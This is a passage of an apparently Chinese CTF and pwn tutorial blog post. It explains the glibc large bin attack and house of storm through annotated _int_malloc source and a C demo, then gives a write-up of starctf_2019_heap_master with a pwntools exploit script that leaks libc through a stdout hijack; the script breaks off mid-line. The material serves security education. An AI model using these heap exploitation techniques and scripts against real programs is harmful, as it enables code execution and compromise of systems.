class="line"><span class="comment">             If a small request, try to use last remainder if it is the</span></span><br><span class="line"><span class="comment">             only chunk in unsorted bin.  This helps promote locality for</span></span><br><span class="line"><span class="comment">             runs of consecutive small requests. This is the only</span></span><br><span class="line"><span class="comment">             exception to best-fit, and applies only when there is</span></span><br><span class="line"><span class="comment">             no exact fit for a small chunk.</span></span><br><span class="line"><span class="comment">           */</span></span><br><span class="line"><span class="comment">//判断smallbin，跳过</span></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp;</span><br><span class="line">              bck == unsorted_chunks (av) &amp;&amp;</span><br><span class="line">              victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">              (<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt; (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="comment">/* split and reattach remainder */</span></span><br><span class="line">              remainder_size = size - nb;</span><br><span class="line">              remainder = chunk_at_offset (victim, nb);</span><br><span class="line">              unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;</span><br><span class="line">              av-&gt;last_remainder = remainder;</span><br><span class="line">              remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);</span><br><span class="line">              <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                &#123;</span><br><span class="line">                  remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                  remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">              set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                        (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">              set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">              set_foot (remainder, remainder_size);</span><br><span class="line"></span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* remove from unsorted list */</span></span><br><span class="line">          unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line">            <span class="comment">//将victem从unsortedbin中移出来，这里是unsortedbin的核心</span></span><br><span class="line">          <span class="comment">/* Take now instead of binning if exact fit */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (size == nb)<span class="comment">//判断当前操作(victim)的size是否和我们申请的chunk的size一样</span></span><br><span class="line">            &#123;<span class="comment">//house of strom</span></span><br><span class="line">              set_inuse_bit_at_offset (victim, size);</span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;<span class="comment">//如果一样直接返回</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* place chunk in bin */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (size))<span class="comment">//如果这个size是smallbin中的则放入smallbin中</span></span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = smallbin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line">            &#125;</span><br><span class="line">          <span class="keyword">else</span><span class="comment">//否则就会放入largebin中//****largebin****///</span></span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = largebin_index (size);<span class="comment">//根据size获取index</span></span><br><span class="line">              bck = bin_at (av, victim_index);<span class="comment">//bck是获取对应bin的地址，如：main_arena+1096处</span></span><br><span class="line">              fwd = bck-&gt;fd;<span class="comment">//fwd是largebin中最大的那个chunk的头节点</span></span><br><span class="line">              </span><br><span class="line">              <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">              <span class="keyword">if</span> (fwd != bck)<span class="comment">//这个是判断当前bin中有没有chunk</span></span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">                  size |= PREV_INUSE;</span><br><span class="line">                  <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">                  assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                  <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) (bck-&gt;bk-&gt;size))</span><br><span class="line">                      <span class="comment">//判断当前操作的chunk的size是不是小于当前bin中最小的size</span></span><br><span class="line">                    &#123;</span><br><span class="line">                      fwd = bck;</span><br><span class="line">                      bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">                      victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                    &#125;</span><br><span class="line">                  <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                      assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                      <span class="keyword">while</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size &lt; fwd-&gt;size)</span><br><span class="line">                          <span class="comment">//判断当前操作的chunk的size是不是小于当前bin中最大的size</span></span><br><span class="line">                        &#123;</span><br><span class="line">                          fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">                          assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                      <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size == (<span class="type">unsigned</span> <span class="type">long</span>) fwd-&gt;size)</span><br><span class="line">                          <span class="comment">//判断当前操作的chunk的size是不是等于当前bin中最大的size</span></span><br><span class="line">                        <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                        fwd = fwd-&gt;fd;</span><br><span class="line">                      <span class="keyword">else</span></span><br><span class="line">                        &#123;<span class="comment">//这是largebin_attack的核心</span></span><br><span class="line">                          victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                          fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                        &#125;</span><br><span class="line">                      bck = fwd-&gt;bk;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          mark_bin (av, victim_index);</span><br><span class="line">          victim-&gt;bk = bck;</span><br><span class="line">          victim-&gt;fd = fwd;</span><br><span class="line">          fwd-&gt;bk = victim;</span><br><span class="line">          bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure>

<ul>
<li>首先保证largebin中有一个chunk(size&gt;0x400)</li>
<li>unsortedbin中有一个比较大的chunk(size&gt;当前laregbin中已有的chunk)</li>
</ul>
<p>然后就可以到达这个分支。</p>
<p><strong>原因：将chunk从unsortedbin中插入到largebin中缺少一些检查</strong></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>2.23 ~ 2.29版本中largebin attack的利用点，在2.30及以后的版本中，加入了双链表检测，所以在libc2.30及以后，该处的largebin attack无法使用了。</p>
<h4 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h4><ul>
<li>构造2个堆：1个大小为unsorted bin范围的chunk，比如0x100，1个大小为large bin范围的，比如0x410，中间再加上其他堆用于隔离防止合并。</li>
</ul>
<h4 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h4><ul>
<li>free这两个chunk， frees顺序为 <code>free(0x410)</code>、<code>free(0x100)</code>，然后malloc(0x100)，这样可以保证在遍历到0x100这个合适的chunk时，能够优先从large bin范围的chunk，得到了一个large bin。</li>
</ul>
<h4 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h4><ul>
<li>构造2个堆：1个大小为unsorted bin范围的chunk，比如0x100，1个大小为large bin范围的但是比现在的large bin里的chunk要大，比如0x410 + 0x10 &#x3D; 0x420。</li>
</ul>
<h4 id="第四步"><a href="#第四步" class="headerlink" title="第四步"></a>第四步</h4><ul>
<li>free这两个chunk， free顺序为 <code>free(0x420)</code>、<code>free(0x100)</code>，此时，堆布局为large bin里一个0x410的chunk，unsorted bin里一个0x420的未归位的large bin，并且未归位的这个0x420的chunk与0x410的large bin属于同一个index。</li>
</ul>
<h4 id="第五步"><a href="#第五步" class="headerlink" title="第五步"></a>第五步</h4><ul>
<li>UAF或其他漏洞，控制large bin里那个chunk的bk和bk_nexsize。</li>
</ul>
<h4 id="第六步"><a href="#第六步" class="headerlink" title="第六步"></a>第六步</h4><ul>
<li>malloc(0x100)，使得malloc遍历unsorted bin，将0x420的chunk放入large bin，发生large bin attack。</li>
</ul>
<h2 id="Large-bin-attack的利用"><a href="#Large-bin-attack的利用" class="headerlink" title="Large bin attack的利用"></a>Large bin attack的利用</h2><h3 id="结合IO-FILE-hijack"><a href="#结合IO-FILE-hijack" class="headerlink" title="结合IO_FILE hijack"></a>结合IO_FILE hijack</h3><ul>
<li>利用large bin attack的任意地址写漏洞特性，错误地将IO 2 1 stdout内部的<code>_IO_write_base</code>修改为0，使得程序调用puts等函数时，能够影响泄露出libc地址，这也就是劫持了stdout。</li>
</ul>
<h3 id="House-of-orange"><a href="#House-of-orange" class="headerlink" title="House of orange"></a>House of orange</h3><ul>
<li>传统的house of orange是利用unsorted bin attack将IO_list全写一个<code>main_arena + 88</code>地址，然后通过<code>chain_next</code>进行转移，而large bin attack更加方便，直接在IO_list全写上一个堆地址，进而伪造IO_FILE结构。</li>
</ul>
<h3 id="Hijack-global-fastmax"><a href="#Hijack-global-fastmax" class="headerlink" title="Hijack global_fastmax"></a>Hijack global_fastmax</h3><ul>
<li>通过large bin attack将<code>global_max_fast</code>修改为一个堆地址，导致free任何chunk，都将放入fastbin，从而利用fastbin attack达到任意地址分配。</li>
</ul>
<h3 id="House-of-strom"><a href="#House-of-strom" class="headerlink" title="House of strom"></a>House of strom</h3><p>理解了large bin attack，接下来，我们就可以来看house of strom了，house of strom可以实现任意地址分配，看看前面的这道题，我们是将一个合法的unsorted bin chunk链接到unsorted bin里未归位的large bin chunk的bk处，假设，我们将一个任意地址比如addr链接到unsorted bin里未归位的large bin chunk的bk处，然后执行large bin attack会发生什么。</p>
<p>那么，在large bin attack阶段不会有问题，只是接下来，继续遍历，取到我们链接上的这个chunk时，检查其size，不符合要求然后崩溃。我们可以利用前面的large bin attack，先将addr处的size的位置写上一个堆指针，我们可以利用错位法，这样，在size处留下了chunk地址值的第6字节数据，在开启PIE的情况下，一般为0x55为0x56，这样，我们malloc(0x40)，遍历到第一个未归位的large bin chunk时，发生large bin attack，接下来遍历到后面这个任意地址的chunk时，发现size符合要求，直接返回给用户，就可以成功把这个任意地址的空间申请过来。</p>
<h2 id="House-of-strom-1"><a href="#House-of-strom-1" class="headerlink" title="House of strom"></a>House of strom</h2><h3 id="House-of-strom原理"><a href="#House-of-strom原理" class="headerlink" title="House of strom原理"></a>House of strom原理</h3><p>该利用手法适用于glibc 2.28及以下的版本，因为unsorted bin attack在glibc 2.29中已失效。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//这里是关于largebin_attack的重点</span></span><br><span class="line">  <span class="keyword">for</span> (;; )<span class="comment">//遍历unsortedbin</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">int</span> iters = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))<span class="comment">//从bk开始遍历</span></span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">          <span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">              || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">            malloc_printerr (check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>,</span><br><span class="line">                             chunk2mem (victim), av);</span><br><span class="line">          size = chunksize (victim);<span class="comment">//获得当前要操作的chunk的size</span></span><br><span class="line">......</span><br><span class="line"><span class="comment">/* Take now instead of binning if exact fit */</span></span><br><span class="line"><span class="keyword">if</span> (size == nb)</span><br><span class="line"><span class="comment">//只进行检查了chunk的size == nb（nb申请的大小）</span></span><br><span class="line">&#123;</span><br><span class="line">    set_inuse_bit_at_offset (victim, size);</span><br><span class="line">    <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">        victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">    check_malloced_chunk (av, victim, nb);</span><br><span class="line">    <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">    alloc_perturb (p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">    <span class="comment">//这里会直接返回p,p就是victim,victim = unsorted_chunks (av)-&gt;bk</span></span><br><span class="line">    <span class="comment">//victim又是unsorted_chunks的bk</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>现在，我们将house of strom里的步骤改一下，将0x100的unsorted bin转换成任意地址，即通过修改unsorted bin里未归位的large bin的bk指针指向任意地址addr，然后修改large bin里有的那个chunk的bk_nexsize为addr - 0x18 - 0x5（错位写入堆地址）。</p>
<p>通过malloc(0x40)即可分配到任意地址addr + 0x10处，这里是因为large bin attack里victim-&gt;bk_nexsize-&gt;fd_nexsize &#x3D; victim即(addr - 0x18 - 0x5) + 0x18 &#x3D; victim，即addr - 0x5 &#x3D; victim。在PIE下，victim地址一般为0x55或0x56开头，并且有6字节有效数据，此时，即相当于*(char *)(addr - 0x5 + 0x5) &#x3D; (addr &gt;&gt; 40) &amp; 0xFF，也就是在addr处写入了0x55或0x56，可以用来充当unsorted bin的size，这样，接下来继续回溯unsorted bin时，仅检查size是否符合请求的一样，一样就可以直接返回这个地址，实现任意地址分配。</p>
<h3 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> buf[<span class="number">0x100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">   <span class="type">char</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x400</span> - <span class="number">0x10</span>);</span><br><span class="line">   <span class="type">char</span> *gap = <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//gap</span></span><br><span class="line">   <span class="type">char</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x410</span> - <span class="number">0x10</span>);</span><br><span class="line">   gap = <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//gap</span></span><br><span class="line">   <span class="built_in">free</span>(p1);</span><br><span class="line">   <span class="built_in">malloc</span>(<span class="number">0x500</span>); <span class="comment">//将p1放入large bin</span></span><br><span class="line">   <span class="built_in">free</span>(p2); <span class="comment">//p2放入unsorted bin   </span></span><br><span class="line">   <span class="type">size_t</span> addr = (<span class="type">size_t</span>)(buf - <span class="number">0x10</span>);</span><br><span class="line">   *(<span class="type">size_t</span> *)(p1+<span class="number">0x8</span>) = addr + <span class="number">0x8</span>; <span class="comment">//修改large bin的bk</span></span><br><span class="line">   *(<span class="type">size_t</span> *)(p1 + <span class="number">0x18</span>) = addr - <span class="number">0x18</span> - <span class="number">0x5</span>; <span class="comment">//修改large bin的bk_nextsize</span></span><br><span class="line">   *(<span class="type">size_t</span> *)(p2 + <span class="number">0x8</span>) = addr;<span class="comment">//修改unsorted bin的bk</span></span><br><span class="line">   <span class="type">char</span> *p = <span class="built_in">malloc</span>(<span class="number">0x48</span>); <span class="comment">//申请到addr处</span></span><br><span class="line">   <span class="built_in">strcpy</span>(p,<span class="string">&quot;hello,welcome to pwn world\n&quot;</span>);</span><br><span class="line">   write(<span class="number">1</span>,buf,<span class="built_in">strlen</span>(buf));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="starctf-2019-heap-master"><a href="#starctf-2019-heap-master" class="headerlink" title="starctf_2019_heap_master"></a>starctf_2019_heap_master</h3><p>ubuntu16.04，glibc2.23&#x2F;glibc2.25</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ctf@70b53f87c516:~/pwn/实验脚本$ checksec starctf_2019_heap_master</span><br><span class="line">[*] <span class="string">&#x27;/home/ctf/pwn/实验脚本/starctf_2019_heap_master&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Full RELRO</span><br><span class="line">    Stack:      Canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        PIE enabled</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure>

<h4 id="ida静态分析"><a href="#ida静态分析" class="headerlink" title="ida静态分析"></a>ida静态分析</h4><h5 id="main"><a href="#main" class="headerlink" title="main()"></a>main()</h5><p><img data-src="/../images/image-20250327214259281.png" alt="image-20250327214259281"></p>
<h5 id="prog-init"><a href="#prog-init" class="headerlink" title="prog_init()"></a>prog_init()</h5><p><img data-src="/../images/image-20250327214321585.png" alt="image-20250327214321585"></p>
<h5 id="add"><a href="#add" class="headerlink" title="add()"></a>add()</h5><p><img data-src="/../images/image-20250327214413213.png" alt="image-20250327214413213"></p>
<p>add()函数，只能malloc()，而不存堆指针</p>
<h5 id="delete"><a href="#delete" class="headerlink" title="delete()"></a>delete()</h5><p><img data-src="/../images/image-20250327214449386.png" alt="image-20250327214449386"></p>
<p>delete()函数，只能free heap_base范围内的</p>
<h5 id="edit"><a href="#edit" class="headerlink" title="edit()"></a>edit()</h5><p><img data-src="/../images/image-20250327214738926.png" alt="image-20250327214738926"></p>
<p>edit()函数也是只能改heap_base范围内的</p>
<p>程序功能上看：</p>
<ul>
<li>程序不能控制add()中malloc()出来的chunk</li>
<li>edit()和delete()只能在heap_base范围内</li>
<li>漏洞点在于可以delete()后继续编辑堆，uaf</li>
</ul>
<p><strong>重点关注的是：这道题的目的之一是让我们在heap_base的范围上去布局堆内存</strong></p>
<h5 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h5><p>程序没有show功能，并且开启了PIE，第一步应该该泄露地址，程序里有调用puts等函数，因而可以hijack IO_2_1_stdout，这里可以用unsorted bin attack或者large bin attack，如果用了unsorted bin attack，后续的利用将无法继续，因为unsorted bin被破坏了，因此，我们选择large bin attack来攻击IO_2_1_stdout。</p>
<p>对于篡改IO_2_1_stdout来泄露数据，flags有要求，必须得经过这两个if，才能到达后方调用syswrite将_IO_write_base与_IO_write_ptr之间的数据信息泄露出来，这就要求flags的<strong>低1字节的低4位不能为8</strong>，<strong>第二字节的低4位必须要为8</strong>，也就是说，我们的unsorted bin chunk地址末尾地址应该为0x800这样。</p>
<p>从以上分析来看，large bin attack攻击IO_2_1_stdout是最为合适的，因为需要修改IO_2_1_stdout里的两处内容，即flags和_IO_write_base。</p>
<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><p>一次运行可能会不成功，这是因为hijack_stdout时需要爆破一个字节</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./starctf_2019_heap_master&#x27;</span></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;G&#x27;</span>]:</span><br><span class="line">	p = remote(<span class="string">&#x27;&#x27;</span>, )</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = process(file_name)</span><br><span class="line">p = process(file_name)</span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">_IO_2_1_stdout_s = libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim, data        :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim, data        :p.sendlineafter(delim, data)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims             :p.recvuntil(delims)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">lg      = <span class="keyword">lambda</span> address, data      :log.success(<span class="string">&#x27;%s:   &#x27;</span> % (address) + <span class="built_in">hex</span>(data))</span><br><span class="line"></span><br><span class="line"><span class="comment">#这里用lambda表达式我的机器会过不了交互</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">   p.sendlineafter(<span class="string">b&#x27;&gt;&gt;&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">   p.sendlineafter(<span class="string">b&#x27;size:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">offset,size,content</span>):</span><br><span class="line">   p.sendlineafter(<span class="string">b&#x27;&gt;&gt;&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">   p.sendlineafter(<span class="string">b&#x27;offset:&#x27;</span>,<span class="built_in">str</span>(offset))</span><br><span class="line">   p.sendlineafter(<span class="string">b&#x27;size:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">   p.sendafter(<span class="string">b&#x27;content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">offset</span>):</span><br><span class="line">   p.sendlineafter(<span class="string">b&#x27;&gt;&gt;&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">   p.sendlineafter(<span class="string">b&#x27;offset:&#x27;</span>,<span class="built_in">str</span>(offset))</span><br><span class="line"></span><br><span class="line"><span class="comment">#伪造8个chunk</span></span><br><span class="line"><span class="comment">#0</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x100</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x421</span>) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0xF0</span>)</span><br><span class="line"><span class="comment">#1</span></span><br><span class="line">edit(<span class="number">0x420</span>,<span class="number">0x20</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#2</span></span><br><span class="line">edit(<span class="number">0x440</span>,<span class="number">0x20</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#3</span></span><br><span class="line">edit(<span class="number">0x880</span>,<span class="number">0x100</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x431</span>) + <span class="string">b&#x27;c&#x27;</span>*<span class="number">0xF0</span>)</span><br><span class="line"><span class="comment">#4</span></span><br><span class="line">edit(<span class="number">0xCB0</span>,<span class="number">0x20</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + <span class="string">b&#x27;d&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#5</span></span><br><span class="line">edit(<span class="number">0xCD0</span>,<span class="number">0x90</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>) + <span class="string">b&#x27;e&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line"><span class="comment">#6</span></span><br><span class="line">edit(<span class="number">0xD60</span>,<span class="number">0x20</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + <span class="string">b&#x27;f&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#7</span></span><br><span class="line">edit(<span class="number">0xD80</span>,<span class="number">0x20</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + <span class="string">b&#x27;g&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#释放0，进入unsortedbin中</span></span><br><span class="line">delete(<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#malloc_consolidate将0放入large bin</span></span><br><span class="line">add(<span class="number">0x430</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#接下来，为了在bk和bk_nextsize处留下libc指针，我们要继续伪造unsorted bin</span></span><br><span class="line"><span class="comment">#在bk_nextsize处留下libc指针</span></span><br><span class="line">edit(<span class="number">0x10</span>,<span class="number">0xF0</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x80</span> + (p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>) * <span class="number">3</span>)</span><br><span class="line">delete(<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">0x80</span>) <span class="comment">#把unsorted bin申请掉</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#在bk留下libc指针</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x10</span>,p64(<span class="number">0</span>) + p64(<span class="number">0xC1</span>))</span><br><span class="line">delete(<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0xB0</span>) <span class="comment">#把unsorted bin申请掉</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#修改large bin的bk，指向stdout</span></span><br><span class="line">edit(<span class="number">0x10</span>,<span class="number">0xA</span>,p64(<span class="number">0</span>) + p16((<span class="number">0x2</span> &lt;&lt; <span class="number">12</span>) + ((_IO_2_1_stdout_s - <span class="number">0x10</span>) &amp; <span class="number">0xFFF</span>)))</span><br><span class="line"><span class="comment">#修改large bin的bk_nextsize，指向_IO_write_base</span></span><br><span class="line">edit(<span class="number">0x20</span>,<span class="number">0xA</span>,p64(<span class="number">0</span>) + p16((<span class="number">0x2</span> &lt;&lt; <span class="number">12</span>) + ((_IO_2_1_stdout_s + <span class="number">0x20</span> - <span class="number">0x20</span> - <span class="number">0x7</span>) &amp; <span class="number">0xFFF</span>)))</span><br><span class="line"><span class="comment">#在这里可以理解一下house of storm的任意地址写是堆glibc源码中哪个位置写</span></span><br><span class="line"><span class="comment">#恢复large bin的头size</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x10</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x421</span>))</span><br><span class="line"><span class="comment">#3放入unsorted bin，3属于未归位的large bin</span></span><br><span class="line">delete(<span class="number">0x890</span>)</span><br><span class="line"><span class="comment">#0x90的堆放入unsorted bin    </span></span><br><span class="line">delete(<span class="number">0xCE0</span>)</span><br><span class="line"><span class="comment">#遍历unsorted bin时发生large bin attack，攻击io_2_1_stdout</span></span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line"><span class="built_in">print</span>(p.recv(<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(p.recv(<span class="number">24</span>))</span><br><span class="line">data = p.recv(<span class="number">6</span>)</span><br><span class="line">libc_base = uu64(data) - libc.sym[<span class="string">&#x27;_IO_file_jumps&#x27;</span>]</span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line">_IO_list_all_addr = libc_base + libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = libc_base + <span 